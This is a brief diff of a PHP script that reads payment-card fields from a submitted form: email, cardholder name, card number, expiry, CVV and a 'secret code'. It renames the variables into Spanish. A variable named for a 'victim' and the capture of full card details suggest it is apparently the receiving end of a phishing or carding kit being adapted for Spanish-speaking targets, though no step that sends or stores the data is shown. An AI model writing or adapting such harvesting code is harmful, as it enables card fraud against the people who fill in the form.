@@ -1,8 +1,8 @@
 <?php
-$ccemail = $_POST['ccemail'];
-$ccnumber = $_POST['ccname'];
-$ccname = $_POST['ccnumber'];
-$ccdate = $_POST['ccmonth'] . "/" . $_POST['ccyear'];
+$correo = $_POST['correo'];
+$nombre = $_POST['nombre'];
+$digitos = $_POST['digitos'];
+$mmaa = $_POST['mmaa'] . "/" . $_POST['ccyear'];
 $cvv = $_POST['cvv'];
 $victisk = $_POST['sekretcode'];
 
